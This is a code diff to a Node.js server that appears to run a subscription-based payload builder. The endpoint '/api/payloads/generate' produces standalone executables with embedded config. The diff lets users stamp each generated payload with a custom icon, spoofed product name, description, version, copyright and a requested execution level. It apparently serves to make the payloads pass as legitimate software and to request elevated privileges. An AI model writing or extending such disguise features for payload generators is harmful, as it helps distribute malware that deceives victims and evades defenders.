@@ -1280,14 +1280,65 @@ const getRcedit = () => {
     return rcedit;
 };
 
-// Helper function to apply icon using rcedit
-const applyIconToExe = async (exePath, iconPath) => {
+// Helper function to apply icon and metadata using rcedit
+const applyIconToExe = async (exePath, iconPath, metadata = {}) => {
     const rceditModule = getRcedit();
     if (!rceditModule) {
         throw new Error('rcedit not installed. Run: npm install rcedit');
     }
     
-    await rceditModule(exePath, { icon: iconPath });
+    const options = {};
+    
+    // Apply icon if provided
+    if (iconPath) {
+        options.icon = iconPath;
+    }
+    
+    // Apply file metadata if provided
+    if (metadata.fileDescription) {
+        options['file-description'] = metadata.fileDescription;
+    }
+    if (metadata.fileVersion) {
+        options['file-version'] = metadata.fileVersion;
+    }
+    if (metadata.productName) {
+        options['product-name'] = metadata.productName;
+    }
+    if (metadata.productVersion) {
+        options['product-version'] = metadata.productVersion;
+    }
+    if (metadata.copyright) {
+        options['copyright'] = metadata.copyright;
+    }
+    
+    // Apply execution level if provided
+    if (metadata.requestedExecutionLevel) {
+        options['requested-execution-level'] = metadata.requestedExecutionLevel;
+    }
+    
+    // Build version-string object for additional metadata
+    const versionString = {};
+    if (metadata.description) {
+        versionString['FileDescription'] = metadata.description;
+    }
+    if (metadata.fileDescription && !metadata.description) {
+        versionString['FileDescription'] = metadata.fileDescription;
+    }
+    if (metadata.productName) {
+        versionString['ProductName'] = metadata.productName;
+    }
+    if (metadata.copyright) {
+        versionString['LegalCopyright'] = metadata.copyright;
+    }
+    
+    if (Object.keys(versionString).length > 0) {
+        options['version-string'] = versionString;
+    }
+    
+    // Only call rcedit if we have options to apply
+    if (Object.keys(options).length > 0) {
+        await rceditModule(exePath, options);
+    }
 };
 
 // Payload generation endpoint - creates a standalone exe with embedded config
@@ -1317,6 +1368,17 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
                 user = req.body.user;
                 outputName = req.body.outputName;
             }
+            
+            // Parse file metadata from form data
+            const fileMetadata = {
+                description: req.body.description || '',
+                fileDescription: req.body.fileDescription || '',
+                fileVersion: req.body.fileVersion || '',
+                productName: req.body.productName || '',
+                productVersion: req.body.productVersion || '',
+                copyright: req.body.copyright || '',
+                requestedExecutionLevel: req.body.requestedExecutionLevel || ''
+            };
 
             // Check subscription status
             if (!userDb.hasActiveSubscription(username)) {
@@ -1377,27 +1439,36 @@ app.post('/api/payloads/generate', authenticateToken, (req, res) => {
             if (iconPath) {
                 console.log(`Custom icon provided: ${iconPath}`);
             }
+            if (Object.values(fileMetadata).some(v => v)) {
+                console.log(`File metadata provided:`, fileMetadata);
+            }
 
-            // If an icon is provided, we need to work with a temp file
+            // If an icon or metadata is provided, we need to work with a temp file
             let exeBuffer;
+            const hasMetadata = Object.values(fileMetadata).some(v => v && v.trim() !== '');
             
-            if (iconPath) {
+            if (iconPath || hasMetadata) {
                 // Create a temp copy of the exe to modify
                 tempExePath = path.join(os.tmpdir(), `payload-${Date.now()}-${Math.random().toString(36).substr(2, 9)}.exe`);
                 fs.copyFileSync(payloadPath, tempExePath);
                 
-                // Apply the icon using rcedit meow meow
+                // Apply the icon and metadata using rcedit
                 try {
-                    await applyIconToExe(tempExePath, iconPath);
-                    console.log('Custom icon applied successfully');
+                    await applyIconToExe(tempExePath, iconPath, fileMetadata);
+                    if (iconPath) {
+                        console.log('Custom icon applied successfully');
+                    }
+                    if (hasMetadata) {
+                        console.log('File metadata applied successfully');
+                    }
                     exeBuffer = fs.readFileSync(tempExePath);
-                } catch (iconError) {
-                    console.error('Failed to apply icon:', iconError);
-                    // Continue without icon on error
+                } catch (editError) {
+                    console.error('Failed to apply icon/metadata:', editError);
+                    // Continue without icon/metadata on error
                     exeBuffer = fs.readFileSync(payloadPath);
                 }
             } else {
-                // No icon, use original exe
+                // No icon or metadata, use original exe
                 exeBuffer = fs.readFileSync(payloadPath);
             }
 
